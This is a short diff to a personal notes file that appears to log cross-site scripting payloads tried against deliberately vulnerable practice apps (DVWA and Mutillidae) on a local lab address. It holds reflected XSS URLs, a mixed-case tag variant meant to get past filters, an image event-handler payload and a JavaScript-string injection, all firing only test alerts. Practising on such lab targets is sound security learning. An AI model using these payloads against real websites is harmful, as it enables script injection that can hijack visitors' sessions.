@@ -6,3 +6,7 @@ http://192.168.1.123/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22tes
 http://192.168.1.123/dvwa/vulnerabilities/xss_r/?name=%3CSCript%3Ealert%28%22test%22%29%3C%2FSCript%3E#
 
 <IMG SRC=# onmouseover="alert('xxs')">
+
+http://192.168.1.123/mutillidae/index.php?page=password-generator.php&username=%22;alert(%22test%22);//
+
+Stored XSS
